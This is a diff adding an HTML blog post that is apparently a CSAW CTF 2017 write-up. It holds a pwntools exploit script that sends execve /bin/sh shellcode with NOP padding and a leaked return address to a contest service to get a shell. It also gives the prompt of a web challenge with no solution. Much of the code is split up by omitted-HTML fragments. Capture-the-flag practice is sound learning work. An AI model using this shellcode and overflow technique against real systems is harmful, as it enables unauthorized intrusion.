@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    
+      <title>CSAW CTF 2017 Prelims - Write Up :: /home/rhama/ — Personal Blog</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="#r = process(&amp;quot;./true&amp;rdquo;)r =remote(&amp;quot;pwn.chal.csaw.io&amp;quot;, 8464)r.recvuntil(&amp;quot;Location:&amp;quot;)shellcode =&amp;quot;\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05&amp;quot;payload =&amp;quot;\x90&amp;quot;*(40-len(shellcode)) payload =shellcode &#43;payload
+addr =int(r.recv(14),16)addr =p64(addr)payload_to_send =payload&#43;addr
+log.info(&amp;quot;Payload Length %d&amp;quot;%(len(payload_to_send)))r.sendlineafter(&amp;quot;Command:&amp;quot;,payload_to_send)r.interactive()I wrote a little proxy program inNodeJS formy poems folder.
+Everyone wants to read flag.txt but I like it too much to share.
+http://web.chal.csaw.io:7311/?path=orange.txt"/>
+<meta name="keywords" content=""/>
+<meta name="robots" content="noodp"/>
+<link rel="canonical" href="/post/2017-11-20-csawctf-2017-quals/" />
+
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+<link rel="shortcut icon" href="/img/favicon.png">
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="CSAW CTF 2017 Prelims - Write Up"/>
+<meta name="twitter:description" content="#r = process(&quot;./true&rdquo;)r =remote(&quot;pwn.chal.csaw.io&quot;, 8464)r.recvuntil(&quot;Location:&quot;)shellcode =&quot;\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05&quot;payload =&quot;\x90&quot;*(40-len(shellcode)) payload =shellcode &#43;payload
+addr =int(r.recv(14),16)addr =p64(addr)payload_to_send =payload&#43;addr
+log.info(&quot;Payload Length %d&quot;%(len(payload_to_send)))r.sendlineafter(&quot;Command:&quot;,payload_to_send)r.interactive()I wrote a little proxy program inNodeJS formy poems folder.
+Everyone wants to read flag.txt but I like it too much to share.
+http://web.chal.csaw.io:7311/?path=orange.txt"/>
+
+
+
+<meta property="og:title" content="CSAW CTF 2017 Prelims - Write Up" />
+<meta property="og:description" content="#r = process(&quot;./true&rdquo;)r =remote(&quot;pwn.chal.csaw.io&quot;, 8464)r.recvuntil(&quot;Location:&quot;)shellcode =&quot;\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05&quot;payload =&quot;\x90&quot;*(40-len(shellcode)) payload =shellcode &#43;payload
+addr =int(r.recv(14),16)addr =p64(addr)payload_to_send =payload&#43;addr
+log.info(&quot;Payload Length %d&quot;%(len(payload_to_send)))r.sendlineafter(&quot;Command:&quot;,payload_to_send)r.interactive()I wrote a little proxy program inNodeJS formy poems folder.
+Everyone wants to read flag.txt but I like it too much to share.
+http://web.chal.csaw.io:7311/?path=orange.txt" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/post/2017-11-20-csawctf-2017-quals/" />
+<meta property="og:site_name" content="/home/rhama/" />
+
+
+
+
+
+
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+    <span class="header__right">
+      
+        <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/about">About</a></li>
+      
+    
+      
+        <li><a href="/showcase">Showcase</a></li>
+      
+    
+  </ul>
+</nav>
+
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
+</header>
+
+
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h1 class="post-title"><a href="/post/2017-11-20-csawctf-2017-quals/">CSAW CTF 2017 Prelims - Write Up</a></h1>
+    <div class="post-meta">
+      
+
+      <span class="post-author">— Written by CTF.Ninja</span>
+      
+    </div>
+
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/csawctf2017prelims/">CSAWCTF2017Prelims</a>&nbsp;
+        
+          #<a href="/tags/ctf/">CTF</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/assets/images/CTF.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --><!-- raw HTML omitted -->#<!-- raw HTML omitted -->r = process(&quot;./true&rdquo;)<!-- raw HTML omitted -->
+r <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->remote<!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;<!-- raw HTML omitted -->pwn.chal.csaw.io<!-- raw HTML omitted -->&quot;<!-- raw HTML omitted -->, <!-- raw HTML omitted -->8464<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted -->r.recvuntil<!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;<!-- raw HTML omitted -->Location:<!-- raw HTML omitted -->&quot;<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p>shellcode <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->\x48<!-- raw HTML omitted --><!-- raw HTML omitted -->\x31<!-- raw HTML omitted -->\xff<!-- raw HTML omitted -->\x48<!-- raw HTML omitted --><!-- raw HTML omitted -->\x31<!-- raw HTML omitted -->\xf6<!-- raw HTML omitted -->\x48<!-- raw HTML omitted --><!-- raw HTML omitted -->\x31<!-- raw HTML omitted -->\xd2<!-- raw HTML omitted -->\x48<!-- raw HTML omitted --><!-- raw HTML omitted -->\x31<!-- raw HTML omitted -->\xc0<!-- raw HTML omitted -->\x50<!-- raw HTML omitted --><!-- raw HTML omitted -->\x48<!-- raw HTML omitted -->\xbb\x2f<!-- raw HTML omitted -->\x62<!-- raw HTML omitted --><!-- raw HTML omitted -->\x69<!-- raw HTML omitted -->\x6e\x2f\x2f<!-- raw HTML omitted -->\x73<!-- raw HTML omitted --><!-- raw HTML omitted -->\x68<!-- raw HTML omitted --><!-- raw HTML omitted -->\x53<!-- raw HTML omitted --><!-- raw HTML omitted -->\x48<!-- raw HTML omitted --><!-- raw HTML omitted -->\x89<!-- raw HTML omitted -->\xe7\xb0\x3b\x0f<!-- raw HTML omitted -->\x05<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;<!-- raw HTML omitted -->
+payload <!-- raw HTML omitted -->=<!-- raw HTML omitted --> <!-- raw HTML omitted -->&quot;<!-- raw HTML omitted --><!-- raw HTML omitted -->\x90<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;<!-- raw HTML omitted --> <!-- raw HTML omitted -->*<!-- raw HTML omitted --> (<!-- raw HTML omitted -->40<!-- raw HTML omitted --> <!-- raw HTML omitted -->-<!-- raw HTML omitted --> <!-- raw HTML omitted --><!-- raw HTML omitted -->len<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->shellcode<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --><!-- raw HTML omitted -->)
+payload <!-- raw HTML omitted -->=<!-- raw HTML omitted --> shellcode <!-- raw HTML omitted -->+<!-- raw HTML omitted --> payload</p>
+<p>addr <!-- raw HTML omitted -->=<!-- raw HTML omitted -->  <!-- raw HTML omitted --><!-- raw HTML omitted -->int<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->r.recv<!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->14<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --><!-- raw HTML omitted -->,<!-- raw HTML omitted -->16<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --><!-- raw HTML omitted -->
+addr <!-- raw HTML omitted -->=<!-- raw HTML omitted -->  <!-- raw HTML omitted -->p64<!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->addr<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --><!-- raw HTML omitted -->
+payload_to_send <!-- raw HTML omitted -->=<!-- raw HTML omitted --> payload<!-- raw HTML omitted -->+<!-- raw HTML omitted -->addr</p>
+<p><!-- raw HTML omitted -->log.info<!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;<!-- raw HTML omitted -->Payload Length <!-- raw HTML omitted -->%d<!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;<!-- raw HTML omitted --> <!-- raw HTML omitted -->%<!-- raw HTML omitted --> (<!-- raw HTML omitted --><!-- raw HTML omitted -->len<!-- raw HTML omitted --><!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->payload_to_send<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted -->r.sendlineafter<!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted --><!-- raw HTML omitted -->&quot;<!-- raw HTML omitted -->Command:<!-- raw HTML omitted -->&quot;<!-- raw HTML omitted -->,payload_to_send<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<!-- raw HTML omitted -->r.interactive<!-- raw HTML omitted -->(<!-- raw HTML omitted --><!-- raw HTML omitted -->)<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<p>I wrote a little proxy program <!-- raw HTML omitted -->in<!-- raw HTML omitted --> NodeJS <!-- raw HTML omitted -->for<!-- raw HTML omitted --> my poems folder.</p>
+<p>Everyone wants to read flag.txt but I like it too much to share.</p>
+<p>http:<!-- raw HTML omitted -->/<!-- raw HTML omitted --><!-- raw HTML omitted -->/<!-- raw HTML omitted -->web.chal.csaw.io:<!-- raw HTML omitted -->7311<!-- raw HTML omitted --><!-- raw HTML omitted -->/<!-- raw HTML omitted -->?path<!-- raw HTML omitted -->=<!-- raw HTML omitted -->orange.txt</p>
+<p><!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+
+    </div>
+    
+      
+        <div class="pagination">
+          <div class="pagination__title">
+            <span class="pagination__title-h">Read other posts</span>
+            <hr />
+          </div>
+          <div class="pagination__buttons">
+            
+              <span class="button previous">
+                <a href="/post/2017-06-25-compfest9-writeup-quals/">
+                  <span class="button__icon">←</span>
+                  <span class="button__text">Compfest 9 - {Preliminary} Write Up</span>
+                </a>
+              </span>
+            
+            
+              <span class="button next">
+                <a href="/post/2017-11-14-csawctf-2017-quals/">
+                  <span class="button__text">CSAW CTF 2017 Prelims Write Up</span>
+                  <span class="button__icon">→</span>
+                </a>
+              </span>
+            
+          </div>
+        </div>
+      
+    
+
+
+    
+      
+        
+
+      
+    
+
+    </div>
+
+      </div>
+
+      
+        <footer class="footer">
+  <div class="footer__inner">
+    
+      <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">ls</span>
+    <span class="logo__cursor"></span>
+  
+</a>
+
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
+        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
+      </div>
+    
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+      
+    </div>
+
+    
+  </body>
+</html>
